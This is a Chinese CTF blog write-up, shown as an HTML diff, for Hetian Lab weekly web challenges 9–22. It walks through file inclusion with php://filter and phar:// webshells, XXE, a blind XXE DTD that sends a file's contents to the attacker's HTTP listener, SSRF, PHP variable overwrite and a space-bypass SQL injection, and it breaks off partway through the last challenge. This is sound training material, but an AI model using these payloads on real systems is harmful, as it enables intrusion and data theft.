@@ -1,0 +1,586 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>合天网安Weekly系列（9-22） - Hannibal0x の Blog</title><meta name="Description" content="Hannibal0x的个人学习博客"><meta property="og:title" content="合天网安Weekly系列（9-22）" />
+<meta property="og:description" content="0x00 前言 继续van。 0x01 第九周 | 试下phpinfo吧 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Cen" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" /><meta property="og:image" content="https://hannibal0x.github.io/images/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-02-04T13:09:11+00:00" />
+<meta property="article:modified_time" content="2021-02-04T13:09:11+00:00" /><meta property="og:site_name" content="Hannibal0x の Blog" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hannibal0x.github.io/images/logo.png"/>
+
+<meta name="twitter:title" content="合天网安Weekly系列（9-22）"/>
+<meta name="twitter:description" content="0x00 前言 继续van。 0x01 第九周 | 试下phpinfo吧 背景说明 本实验无writeup，需要同学们发挥自己所学，拿下最终目标。 实验环境 目标机：Cen"/>
+<meta name="application-name" content="Hannibal0x の Blog">
+<meta name="apple-mobile-web-app-title" content="Hannibal0x の Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/images/logo.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hannibal0x.github.io/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22/" /><link rel="prev" href="https://hannibal0x.github.io/2021-02-03-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%97%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" /><link rel="next" href="https://hannibal0x.github.io/2021-02-08-nepnep-winter-campmisc%E5%90%88%E9%9B%86/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "合天网安Weekly系列（9-22）",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hannibal0x.github.io\/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22\/"
+        },"genre": "posts","keywords": "Web安全, CTF","wordcount":  3398 ,
+        "url": "https:\/\/hannibal0x.github.io\/2021-02-04-%E5%90%88%E5%A4%A9%E7%BD%91%E5%AE%89weekly%E7%B3%BB%E5%88%979-22\/","datePublished": "2021-02-04T13:09:11+00:00","dateModified": "2021-02-04T13:09:11+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Hannibal0x"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"><i class='fas fa-book'></i> 文章 </a><a class="menu-item" href="/tags/"><i class='fas fa-tags'></i> 标签 </a><a class="menu-item" href="/categories/"><i class='fas fa-folder'></i> 分类 </a><a class="menu-item" href="/categories/writeup"><i class='fas fa-flag'></i> CTF </a><a class="menu-item" href="/about/"><i class='fas fa-key'></i> 关于 </a><a class="menu-item" href="http://hannibal0x.top" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i> 旧博客 </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Hannibal0x の Blog"><img
+        class="lazyload logo"
+        src="/svg/loading.min.svg"
+        data-src="/images/logo.png"
+        data-srcset="/images/logo.png, /images/logo.png 1.5x, /images/logo.png 2x"
+        data-sizes="auto"
+        alt="/images/logo.png"
+        title="/images/logo.png" width="32" height="32" />Hannibal0x の Blog</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="都几岁啦，还这么害羞，让我康康！" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title=""><i class='fas fa-book'></i>文章</a><a class="menu-item" href="/tags/" title=""><i class='fas fa-tags'></i>标签</a><a class="menu-item" href="/categories/" title=""><i class='fas fa-folder'></i>分类</a><a class="menu-item" href="/categories/writeup" title=""><i class='fas fa-flag'></i>CTF</a><a class="menu-item" href="/about/" title=""><i class='fas fa-key'></i>关于</a><a class="menu-item" href="http://hannibal0x.top" title="" rel="noopener noreffer" target="_blank"><i class='fas fa-history'></i>旧博客</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">合天网安Weekly系列（9-22）</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Hannibal0x</a></span>&nbsp;<span class="post-category">included in <a href="/categories/writeup/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>WriteUp</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-02-04">2021-02-04</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;3398 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;7 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#0x00-前言">0x00 前言</a></li>
+    <li><a href="#0x01-第九周--试下phpinfo吧">0x01 第九周 | 试下phpinfo吧</a></li>
+    <li><a href="#0x02-第十周--试试协议吧">0x02 第十周 | 试试协议吧</a></li>
+    <li><a href="#0x03-第十一周--签到般的包含">0x03 第十一周 | 签到般的包含</a></li>
+    <li><a href="#0x04-第十三周--simple-xxe">0x04 第十三周 | simple xxe</a></li>
+    <li><a href="#0x05-第十四周--blind-xxe">0x05 第十四周 | blind xxe</a></li>
+    <li><a href="#0x06-第十五周--回显的ssrf">0x06 第十五周 | 回显的SSRF</a></li>
+    <li><a href="#0x07-第十六周--有点另类的ssrf">0x07 第十六周 | 有点另类的SSRF</a></li>
+    <li><a href="#0x08-第十七周--给你扔了串代码">0x08 第十七周 | 给你扔了串代码</a></li>
+    <li><a href="#0x09-第十八周--学会变量覆盖">0x09 第十八周 | 学会变量覆盖</a></li>
+    <li><a href="#0x0a-第十九周--easy-php">0x0A 第十九周 | Easy PHP</a></li>
+    <li><a href="#0x0b-第二十周--最后一道变量覆盖">0x0B 第二十周 | 最后一道变量覆盖</a></li>
+    <li><a href="#0x0c-第二十一周--你的空格哪去了">0x0C 第二十一周 | 你的空格哪去了</a></li>
+    <li><a href="#0x0d-第二十二周--想想怎么绕过过滤吧">0x0D 第二十二周 | 想想怎么绕过过滤吧</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div class="has-toc have-toc">
+</div>
+<h2 id="0x00-前言">0x00 前言</h2>
+<p>继续van。</p>
+<h2 id="0x01-第九周--试下phpinfo吧">0x01 第九周 | 试下phpinfo吧</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5009</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>根据题目，需要用到phpinfo页面。猜测需要利用文件包含漏洞。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-44.png" alt="" class="wp-image-623" width="460" height="99" /></figure>
+</div>
+<p>把cn.php替换成phpinfo.php后失效，判断文件不在此目录，跳到父目录。打开了phpinfo。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-49.png" alt="" class="wp-image-643" width="465" height="338" /></figure>
+</div>
+<p>网页底部藏着<code>flag{abcd_hetianlab_1234_qwer}</code></p>
+<h2 id="0x02-第十周--试试协议吧">0x02 第十周 | 试试协议吧</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5010</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>一进去就蹦出来个链接，点进去。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="166" height="42" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-46.png" alt="" class="wp-image-637" /></figure>
+</div>
+<p>改下flie。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="130" height="35" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-47.png" alt="" class="wp-image-638" /></figure>
+</div>
+<p>题目说要运用协议，那就尝试一番。<code>php://filter/convert.base64-encode/resource=flag.php</code>，就出来了一串base64编码。</p>
+<pre class="wp-block-code"><code>ZmxhZyBpbiBoZXJlDQo8P3BocCAvL2ZsYWd7YWJkY18xMjM0X3F3ZXJfaGV0aWFufT8+</code></pre>
+<p>成功拿到<code>flag{abdc_1234_qwer_hetian}</code></p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="258" height="42" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-48.png" alt="" class="wp-image-641" /></figure>
+</div>
+<h2 id="0x03-第十一周--签到般的包含">0x03 第十一周 | 签到般的包含</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5011</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}，菜刀目录：C:\tools\</li>
+</ul>
+</li>
+</ul>
+<p>传图片，直接失败。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-72.png" alt="" class="wp-image-731" width="191" height="96" /></figure>
+</div>
+<p>测试发现jpg类型可以上传。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="478" height="46" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-74.png" alt="" class="wp-image-736" /></figure>
+</div>
+<p>进入文件夹看一看。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-75.png" alt="" class="wp-image-738" width="367" height="278" /></figure>
+</div>
+<p>题目说有个include.php文件，应该是个文件包含漏洞 ，输入url路径。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-73.png" alt="" class="wp-image-733" width="490" height="108" /></figure>
+</div>
+<p>看了一位师傅的<a rel="noreferrer noopener" href="https://blog.csdn.net/m0_49835838/article/details/107761632" data-type="URL" data-id="https://blog.csdn.net/m0_49835838/article/details/107761632" target="_blank" rel="nofollow" >WP</a>，要用phar伪协议，这个协议可以访问zip格式压缩包内容，我们先构造一个压缩包写一个php一句话到1.php，再把1.php压缩成1.zip，为了成为白名单，把1.zip后缀改为jpg，成功上传。</p>
+<p>在菜刀输入<code>http://10.1.1.147:5011/include.php?file=phar://a.jpg/a</code>，连上WebShell。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-77.png" alt="" class="wp-image-748" width="418" height="180" /></figure>
+</div>
+<p>得到<code>flag{whoami_hetianlab_student}</code>。</p>
+<p class="has-vivid-red-color has-text-color">
+  <strong>Ps：没有第十二周的实验</strong>，但可以根据题目iP猜测10.1.1.147:5012，进去提示加file参数
+</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="828" height="624" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-95.png" alt="" class="wp-image-816" /></figure>
+</div>
+<p class="has-vivid-red-color has-text-color">
+  没啥思路，搜了下，发现有师傅做过<a rel="noreferrer noopener" href="https://www.bilibili.com/video/BV1jD4y1U7Vy" data-type="URL" data-id="https://www.bilibili.com/video/BV1jD4y1U7Vy" target="_blank" rel="nofollow" >视频</a>，视频开头给出了相关的题目信息，菜刀、日志路径、ubuntu系统和LFI（Local File Include），现有环境下按照师傅的方法无法复现，这题主要是通过<code>/var/log/apache2/access.log</code>进行命令执行，讲得挺好的。
+</p>
+<h2 id="0x04-第十三周--simple-xxe">0x04 第十三周 | simple xxe</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5013</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>查看源码，发现信息。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="1294" height="200" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-91.png" alt="" class="wp-image-808" /></figure>
+</div>
+<p>随便输入后抓个包，发现用户名和密码是通过XML标签传值的，题目也明说了，要用XXE（XML External Entity）。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-92.png" alt="" class="wp-image-811" width="491" height="193" /></figure>
+</div>
+<p>借助file协议实现外部实体声明来读取文件，代码如下：</p>
+<pre class="wp-block-code"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
+&lt;!DOCTYPE root &#91;
+&lt;!ENTITY xxe SYSTEM "file:///opt/flag.txt"&gt;
+]&gt;
+&lt;user&gt;&lt;username&gt;&xxe;&lt;/username&gt;&lt;password&gt;1&lt;/password&gt;&lt;/user&gt;</code></pre>
+<p>成功拿到。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-93.png" alt="" class="wp-image-813" width="721" height="250" /></figure>
+</div>
+<h2 id="0x05-第十四周--blind-xxe">0x05 第十四周 | blind xxe</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5014</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>题目考察Blind XXE，查看源码发现目标文件。<figure class="wp-block-image size-large is-resized"></p>
+<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-96.png" alt="" class="wp-image-831" width="812" height="77" /> </figure></p>
+<p><code>ifconfig</code>查看本机ip为<code>10.1.1.100</code>，这里发现Apache服务没有开启，使用<code>service apache2 start</code>。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-97.png" alt="" class="wp-image-834" width="491" height="307" /></figure>
+</div>
+<p>采用如下的payload</p>
+<pre class="wp-block-code"><code>post:
+&lt;!DOCTYPE root &#91; 
+&lt;!ENTITY % remote SYSTEM "http://10.1.1.100/1.dtd"&gt;
+%remote;%int;%send;
+]&gt;
+
+1.dtd的内容
+&lt;!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///tmp/password.txt"&gt;
+&lt;!ENTITY % int "&lt;!ENTITY &#37; send SYSTEM 'http://10.1.1.100:9999?p=%file;'&gt;"&gt;
+
+python -m SimpleHTTPServer 9999</code></pre>
+<p>得到一串base64编码<code>ZmxhZ3toZXRpYW5fMTIzNF9hd2RyfQo=</code>，解码得到<code>flag{hetian_1234_awdr}</code></p>
+<h2 id="0x06-第十五周--回显的ssrf">0x06 第十五周 | 回显的SSRF</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5015</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>给出了flag在/opt/flag.txt，题目明示了是有回显的SSRF，用file协议直接读取。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="1276" height="347" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-140.png" alt="" class="wp-image-1123" /></figure>
+</div>
+<h2 id="0x07-第十六周--有点另类的ssrf">0x07 第十六周 | 有点另类的SSRF</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5016</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>按照上一个实验的步骤用file协议直接读取，提示要以管理员身份登录。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-141.png" alt="" class="wp-image-1125" width="358" height="227" /></figure>
+</div>
+<p>使用BurpPOST一个admin的值，得到下一条提示信息。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-142.png" alt="" class="wp-image-1127" width="788" height="162" /></figure>
+</div>
+<p>使用X-Forwarded-For、X-Real-Ip、X-Client-Ip、Client-Ip等来伪造ip。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="532" height="180" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-143.png" alt="" class="wp-image-1129" /></figure>
+</div>
+<p>打开source.txt，查看源码，能看到flag的文件位置。</p>
+<pre class="wp-block-code"><code>&lt;?php 
+// /opt/flag.txt
+
+function getUrlContent($url){
+    // $url = safe($url);
+    $url = escapeshellarg($url);
+    $pl = "curl ".$url;
+    // echo $pl;
+    $content = shell_exec($pl);
+    return $content;
+}
+
+echo "you need to login as admin!";
+echo "&lt;!-- post param  'admin' --&gt;";
+if(isset($_POST&#91;'admin']))
+{
+    if($_POST&#91;'admin']==1)
+    {
+        if($_SERVER&#91;'HTTP_X_CLIENT_IP'])
+        {
+            echo "fileread source.txt";
+            if (isset($_POST&#91;'handler'])&&!empty($_POST&#91;'handler']))
+            {
+					$url = $_POST&#91;'handler'];
+					$content_url = getUrlContent($url);
+					echo $content_url;
+}
+}
+        else
+            {
+                echo "only 127.0.0.1 can get the flag!!";
+            }
+}else
+{
+	$_POST&#91;'admin']=0;
+}
+}</code></pre>
+<h2 id="0x08-第十七周--给你扔了串代码">0x08 第十七周 | 给你扔了串代码</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5017</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>首页给出了源代码的图片。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-144.png" alt="" class="wp-image-1132" width="457" height="326" /></figure>
+</div>
+<p>这是一道变量覆盖的题目，重点关注这两段代码。</p>
+<pre class="wp-block-code"><code>foreach ($_GET as $key =&gt;$value){
+       $$key=$$value;
+}foreach ($_POST as $key =&gt;$value){
+       $$key=$value;
+}</code></pre>
+<p>这道题说f12可以使用hackbar，但实际上用不了，换个环境，继续做。Get传值时将$_200的值设为$flag的值，POST传值flag=随便的数，就能绕过，然后输出$_200里的值。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-146.png" alt="" class="wp-image-1137" width="309" height="317" /></figure>
+</div>
+<h2 id="0x09-第十八周--学会变量覆盖">0x09 第十八周 | 学会变量覆盖</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5018</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>查看源代码信息。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-147.png" alt="" class="wp-image-1141" width="374" height="283" /></figure>
+</div>
+<p>试一下url后加上<code>/?gift</code>=，直接得到<code>flag{hetianlab}</code>，猜测变量content的值为空，变量flag需要传上去。</p>
+<h2 id="0x0a-第十九周--easy-php">0x0A 第十九周 | Easy PHP</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5019</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>分析源码</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="566" height="517" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-148.png" alt="" class="wp-image-1147" /></figure>
+</div>
+<p>重点关注Get传值方法，设一个中间变量来传递flag的值。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large is-resized"><img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-149.png" alt="" class="wp-image-1149" width="387" height="197" /></figure>
+</div>
+<h2 id="0x0b-第二十周--最后一道变量覆盖">0x0B 第二十周 | 最后一道变量覆盖</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5020</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>分析源码</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="741" height="514" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-150.png" alt="" class="wp-image-1153" /></figure>
+</div>
+<p>这个需要利用PHP的弱类型来进行md5碰撞和parse_str的变量覆盖。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="558" height="93" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-151.png" alt="" class="wp-image-1155" /></figure>
+</div>
+<h2 id="0x0c-第二十一周--你的空格哪去了">0x0C 第二十一周 | 你的空格哪去了</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
+<li>本实验无writeup，需要同学们发挥自己所学，拿下最终目标。</li>
+</ul>
+</li>
+<li><strong>实验环境</strong>
+<ul>
+<li>目标机：Centos7 IP地址：10.1.1.147:5021</li>
+<li>攻击机：Kali IP地址：随机分配</li>
+<li>要求：获取目标flag</li>
+<li>提示：flag格式为Flag{}</li>
+</ul>
+</li>
+</ul>
+<p>简单的SQL注入，需要绕过空格的过滤。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="889" height="596" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-152.png" alt="" class="wp-image-1159" /></figure>
+</div>
+<p>经过测试在order by 3时能够正常回显，order by 4时无回显，可知列数为3。构造语句<code>0'union/**/select/**/1,flag,3/**/from/**/flag#</code>，成功回显。</p>
+<div class="wp-block-image">
+  <figure class="aligncenter size-large"><img loading="lazy" width="312" height="74" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/02/图片-153.png" alt="" class="wp-image-1161" /></figure>
+</div>
+<h2 id="0x0d-第二十二周--想想怎么绕过过滤吧">0x0D 第二十二周 | 想想怎么绕过过滤吧</h2>
+<ul>
+<li><strong>背景说明</strong>
+<ul>
